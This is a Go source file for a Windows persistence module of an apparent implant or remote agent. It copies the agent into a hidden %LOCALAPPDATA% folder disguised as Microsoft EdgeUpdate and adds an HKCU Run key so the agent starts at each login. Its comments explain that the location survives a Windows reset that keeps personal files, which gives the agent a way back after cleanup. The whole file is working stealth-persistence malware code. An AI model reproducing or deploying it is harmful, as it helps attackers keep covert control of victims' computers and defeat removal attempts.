//go:build windows && persist_userprofile
// +build windows,persist_userprofile

package persistence

// persist_userprofile places a copy of the agent in %USERPROFILE%\AppData\Local
// under a plausible Microsoft sub-directory and registers it via a Run key.
//
// This directory is classified as "personal files" by the Windows Reset wizard
// and is migrated back when the user chooses "Keep my files", giving the agent
// a path back to execution even after a system reset that wipes scheduled tasks,
// WMI subscriptions and the HKCU registry hive.

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// DefaultLocalBinaryDir is the LOCALAPPDATA-relative directory for the userprofile copy.
// Injectable via -X ldflag at build time.
var DefaultLocalBinaryDir = `Microsoft\EdgeUpdate`

func runValueNameUserprofile() string {
	return registryValueNamePrefix() + "up"
}

func init() {
	persistInstallFns = append(persistInstallFns, installUserProfile)
	persistUninstallFns = append(persistUninstallFns, uninstallUserProfile)
}

func getUserProfileTargetPath() (string, error) {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return "", fmt.Errorf("LOCALAPPDATA not set")
	}
	dir := filepath.Join(localAppData, DefaultLocalBinaryDir)
	if existing, ok := findExistingBinaryInDir(dir); ok {
		return existing, nil
	}
	name, err := generateBinaryName()
	if err != nil {
		return "", err
	}
	return filepath.Join(dir, name), nil
}

func installUserProfile(exePath string) error {
	targetPath, err := getUserProfileTargetPath()
	if err != nil {
		return fmt.Errorf("userprofile: get target path: %w", err)
	}

	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("userprofile: create dir: %w", err)
	}
	tryHideDirectory(dir)

	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return fmt.Errorf("userprofile: copy binary: %w", err)
		}
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
		registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("userprofile: open run key: %w", err)
	}
	defer k.Close()

	quoted := `"` + targetPath + `"`
	if err := k.SetStringValue(runValueNameUserprofile(), quoted); err != nil {
		return fmt.Errorf("userprofile: set run value: %w", err)
	}
	return nil
}

func uninstallUserProfile() error {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return nil
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
		registry.SET_VALUE)
	if err == nil {
		_ = k.DeleteValue(runValueNameUserprofile())
		k.Close()
	}

	_ = cleanupPrefixedExecutables(filepath.Join(localAppData, DefaultLocalBinaryDir))
	return nil
}
